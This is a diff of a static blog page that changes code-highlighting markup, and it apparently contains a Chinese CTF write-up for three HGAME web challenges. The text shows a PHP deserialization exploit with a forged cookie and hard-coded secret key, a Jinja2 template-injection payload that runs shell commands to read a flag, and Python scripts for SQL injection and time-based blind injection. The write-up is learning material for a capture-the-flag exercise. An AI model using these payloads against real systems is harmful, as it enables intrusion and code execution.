@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -239,7 +247,7 @@
             
             <div class="markdown-body">
               <h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>题目描述：<code>........r4u用git部署到了自己的服务器上......</code><br>提示<code>.git</code>泄露<br>githack一下得到源码     </p>
-<div class="hljs"><pre><code>//index.php
+<pre><code>//index.php
 
 &lt;?php
 error_reporting(0);
@@ -405,13 +413,13 @@ class Eeeeeeevallllllll&#123;
     &#123;
         echo $this-&gt;msg;
     &#125;
-&#125;     </code></pre></div>
+&#125;     </code></pre>
 <p>通看一遍的话，主要看到几个魔法函数<br>其中：     </p>
-<div class="hljs"><pre><code>public function __toString()&#123;
+<pre><code>public function __toString()&#123;
         return file_get_contents($this-&gt;file);
-    &#125;        </code></pre></div>
+    &#125;        </code></pre>
 <p><code>file_get_content</code>可以让我们读取文件<br>最后的echo可以触发<code>__toString</code><br>然后是那个<code>unserialize</code><br>想要反序列化，必须满足cookie<br>所以需要看cookie的生成来自己构造cookie     </p>
-<div class="hljs"><pre><code>&lt;?php
+<pre><code>&lt;?php
 class Eeeeeeevallllllll&#123;
     public $msg;
 &#125;
@@ -426,7 +434,7 @@ $SECRET_KEY=&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
 $sign = base64_encode(md5($b . $SECRET_KEY));
 $value = base64_encode($b) . &quot;.&quot; . $sign;
 echo $value;
-?&gt;   </code></pre></div>
+?&gt;   </code></pre>
 <p>这个出来的和wp相比差了一些，但可以得到flag             </p>
 <p>反序列化后<code>$this-&gt;sessionData = unserialize($data);</code><br>最后触发<code>__toString</code><br>返回flag<br>..<br>..<br>..<br>…<br>还是有点懵……….先就这吧        </p>
 <h2 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h2><p>题目描述：<code>.........Python 写了一个 TodoList.....</code><br>模板注入<br>注册后发一个已完成的<code>&#123;&#123;7*7&#125;&#125;</code>查看后是49        </p>
@@ -434,7 +442,7 @@ echo $value;
 <p>包含 <code>hgame</code> 和 <code>emagh</code> 的字符串都会被替换为 <code>Stop!!!</code><br>可以以<code>base64</code>输出<br>payload:<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag | base64').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p>
 <h2 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/f2a261a9c5cd3ea3.png" srcset="/img/loading.gif"><br>一个登录界面<br>正常输入，回显是<code>WARNING! LOGIN FIALED! System is being maintained.</code>一个弹窗<br>带符号的话，回显是<code> Invalid username</code>弹窗<br>wp中<br>SQL语句是：<code>SELECT * FROM `u5ers` WHERE `usern@me`=&#39;$username&#39; and `p@ssword`=&#39;$password&#39;</code><br>然后可以用<code>\</code>转义第二个<code>&#39;</code><br><code>username=admin\</code><br><code>password=or 1=1#</code><br>原语句就变为:<code> WHERE `usern@me`=&#39;admin\&#39;or 1=1#&#39;</code><br>时间盲注：      </p>
 <p>枚举法：       </p>
-<div class="hljs"><pre><code>import requests
+<pre><code>import requests
 import time
 import datetime
 
@@ -456,9 +464,9 @@ for i in range(1,100):
             print(flag)
             break
         else:
-            j=j+1        </code></pre></div>
+            j=j+1        </code></pre>
 <p>然后是用python fuzz过滤的符号—学到了     </p>
-<div class="hljs"><pre><code>import requests
+<pre><code>import requests
 
 url=&#39;https://jailbreak.liki.link/login.php&#39;
 str=&#39;WARNING! LOGIN FIALED!&#39;
@@ -467,7 +475,7 @@ for i in range(30,128):
     data=&#123;&#39;username&#39;:st,&#39;password&#39;:st&#125;
     r=requests.post(url=url,data=data)
     if str not in r.text:
-        print(st)</code></pre></div>
+        print(st)</code></pre>
 
             </div>
             <hr>
@@ -612,6 +620,8 @@ for i in range(30,128):
 
 
 
+  
+    
   
 
 
